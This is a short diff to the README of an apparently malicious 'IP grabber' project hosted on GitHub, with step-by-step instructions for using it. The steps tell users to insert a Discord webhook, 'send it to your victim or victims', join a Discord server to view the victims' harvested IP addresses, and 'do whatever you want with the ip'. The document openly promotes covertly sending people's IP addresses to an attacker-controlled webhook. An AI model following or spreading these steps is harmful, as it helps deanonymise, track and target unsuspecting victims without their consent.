@@ -14,7 +14,7 @@
 1. Go to releases tab and search for `https://github.com/Doundeway/Future-ip-grabber/releases/tag/1.0`
 2. Paste your webhook into `sender webhook = new sender("https://discord.com/api/webhooks/{your webhook id}");`
 3. Send it to your victim or victims
-4. Join this discord server to see your victims ip `https://discord.gg/TbpbZ5Xnss`
+4. Join this discord server to see your victims ip `https://discord.gg/TbpbZ5Xnss`(if you decide to use the default webhook url)
 5. Do whatever you want with the ip
 
 
